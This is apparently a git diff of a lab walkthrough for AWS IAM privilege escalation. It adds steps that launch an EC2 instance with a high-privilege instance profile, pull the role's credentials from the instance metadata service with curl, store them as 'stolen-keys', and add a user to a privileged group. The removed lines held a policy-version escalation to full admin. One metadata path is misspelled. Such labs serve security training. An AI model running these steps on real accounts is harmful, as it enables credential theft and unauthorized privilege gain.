@@ -243,9 +243,11 @@ OR import existing one:
 aws ec2 import-key-pair --key-name id_rsa --public-key-material fileb://~/.ssh/id_rsa.pub --region us-east-1
 ```
 
-11.  Create an EC2 instance with optional `--profile` flag
+11.  Create an EC2 instance with the higher privilege instance-profile optional `--profile` flag
 
-**TODO - Below is example, however need add explanation**
+**TODO - Below is example
+    - need add explanation
+    - requires SSH inbound rule either already set or must be created**
 
 ```
 aws ec2 run-instances --image-id ami-0708edb40a885c6ee --instance-type t2.micro --iam-instance-profile Name=privesc-high-priv-service-profile --key-name my-key-pair --security-group-ids sg-04edcd63f405badb6 --region us-east-1
@@ -264,68 +266,42 @@ ssh ubuntu@<INSTANCE_PUBLIC_IP> -i my-key-pair.pem
 ssh ubuntu@<INSTANCE_PUBLIC_IP> -i ~/.ssh/id_rsa
 ```
 
-## LEFT OFF HERE
-
-5. Create a new version of the policy, based on the new policy document, and set as default for the user.  Optionally you can add --profile flag.
+14. Run a curl command inside the machine to access with the role name - TODO, provide detail as to how to get the role name
+Refs: 
+- https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html
+- https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html
 ```
-aws iam create-policy-version --policy-arn <POLICY_ARN> --policy-document file://admin_policy.json --set-as-default
+#IMDSv1
+curl http://169.254.169.254/latest/meta-data/iam/securitycredentials/privesc-high-priv-service-role
 ```
-
-> Example Output:
 ```
-{
-    "PolicyVersion": {
-        "VersionId": "v2",
-        "IsDefaultVersion": true,
-        "CreateDate": "2022-05-09T04:52:13+00:00"
-    }
-}
+# IMDSv2
+TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
+&& curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials/privesc-high-priv-service-role
 ```
 
-6. Re-list policy versions and you should see the new version added and also set as new default.
+15. From another termnial (not the ssh session), create a new profile and add the access, secret key, and region and then edit the credentials file to also add the token
 
 ```
-aws iam list-policy-versions --policy-arn <POLICY_ARN>
+aws configure --profile stolen-keys
 ```
+```
+vi ~/.aws/credentials
 
-> Example Output:
+aws_session_token = <TOKEN>
 ```
-{
-    "Versions": [
-        {
-            "VersionId": "v2",
-            "IsDefaultVersion": true,
-            "CreateDate": "2022-05-09T04:52:13+00:00"
-        },
-        {
-            "VersionId": "v1",
-            "IsDefaultVersion": false,
-            "CreateDate": "2022-05-09T03:28:11+00:00"
-        }
-    ]
-}
+ 
+16. Add user to group 
 ```
+aws iam add-user-to-group --group-name privesc-sre-group --user-name privesc3-CreateEC2WithExistingInstanceProfile-user --profile stolen-keys
+```
+ 
+17. Verify the user now belows to the higher privilege group with optional `--profile` flag
+```
+aws iam list-groups-for-user --user-name privesc3-CreateEC2WithExistingInstanceProfile-user
+``` 
 
-7. View the details of the new version of the policy.
-
-```
-aws iam get-policy-version --policy-arn <POLICY_ARN> --version-id v2
-{
-    "PolicyVersion": {
-        "Document": {
-            "Version": "2012-10-17",
-            "Statement": [
-                {
-                    "Sid": "AllowEverything",
-                    "Effect": "Allow",
-                    "Action": "*",
-                    "Resource": "*"
-                }
-            ]
-        },
-        "VersionId": "v2",
-        "IsDefaultVersion": true,
-        "CreateDate": "2022-05-09T04:52:13+00:00"
-    }
-}
-```
+## References:
+https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-files.html
+https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html
+https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html
